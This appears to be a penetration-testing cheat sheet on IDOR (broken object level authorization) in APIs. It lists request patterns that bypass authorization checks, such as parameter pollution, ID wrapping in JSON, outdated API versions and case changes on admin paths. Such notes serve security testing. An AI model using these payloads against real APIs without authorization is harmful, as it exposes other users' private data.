IDOR API TESTING

**API1:2019 Broken Object Level Authorization**

- Add parameter to the endpoint

```html
GET /api_v1/messages -> 401
vs 
GET /api_v1/messages?user_id=victim_uuid -> 200
```

**Note**: Useful tool to bruteforce common IDOR URL parameter names [Arjun](https://github.com/s0md3v/Arjun).


- HTTP Parameter pollution

```html
GET /api_v1/messages?user_id=VICTIM_ID -> 401
GET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID -> 200

GET /api_v1/messages?user_id=YOUR_USER_ID[]&user_id=ANOTHER_USERS_ID[]
```

- Add .json to the endpoint

```html
/user_data/2341 -> 401 
/user_data/2341.json -> 200 
```

- Test on outdated API Versions

```html
/v3/users_data/1234 -> 403 
/v1/users_data/1234 -> 200 
```

Wrap the ID with an array.

```html
{“id”:111} -> 401 
{“id”:[111]} -> 200 
```

Wrap the ID with a JSON object:

```html
{“id”:111} -> 401 

{“id”:{“id”:111}} -> 200 
```

JSON Parameter Pollution:

```html
POST /api/get_profile
Content-Type: application/json
{“user_id”:<legitid>,”user_id”:<victim>}
```

MFLAC:

```html
GET /admin/profile --> 401 

GET /ADMIN/profile --> 200 
```
